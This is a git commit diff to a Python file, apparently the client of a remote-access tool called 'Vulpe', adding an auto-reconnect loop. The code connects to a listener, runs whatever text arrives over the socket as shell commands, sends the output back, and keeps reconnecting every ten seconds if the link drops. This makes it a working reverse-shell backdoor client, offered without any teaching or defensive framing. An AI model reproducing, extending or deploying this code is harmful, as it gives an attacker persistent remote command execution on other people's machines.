c7de63d897efd4916cb170a9fd4eb820269ee215
madison <69394836+xorsirenz@users.noreply.github.com>
2024-11-20 20:06:26 -0700

    auto reconnect loop added

--- src/client/client_server.py
+++ src/client/client_server.py
@@ -1,22 +1,39 @@
 import os
 import socket
 import subprocess
+from time import sleep
 
 host = '127.0.0.1'
 port = 9090
 
-s = socket.socket()
-s.connect((host,port))
+def connection(s):
+    while True:
+        try:
+            data = s.recv(4096)
+            if data[:2].decode("utf-8") == 'cd':
+                os.chdir(data[3:].decode("utf-8"))
+            if len(data) > 0:
+                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                output_str = str(output_bytes, "utf-8")
+                s.send(str.encode(output_str + str(f"[{os.getcwd()}]$ ")))
+            if not data:
+                print('[-] Trying to reconnect to Vulpe..')
+                try:
+                    #s.close
+                    setup()
+                except socket.error:
+                    sleep(10)
+        except socket.error:
+            pass
 
-while True:
-    data = s.recv(1024)
-    if data[:2].decode("utf-8") == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        output_bytes = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_bytes, "utf-8")
-        s.send(str.encode(output_str + str(f"[{os.getcwd()}]$ ")))
+    s.close()
 
-s.close()
+def setup():
+    s = socket.socket()
+    s.connect((host, port))
+    s.setblocking(False)
+    print("[+] Connected to Vulpe")
+    connection(s)
 
+setup()
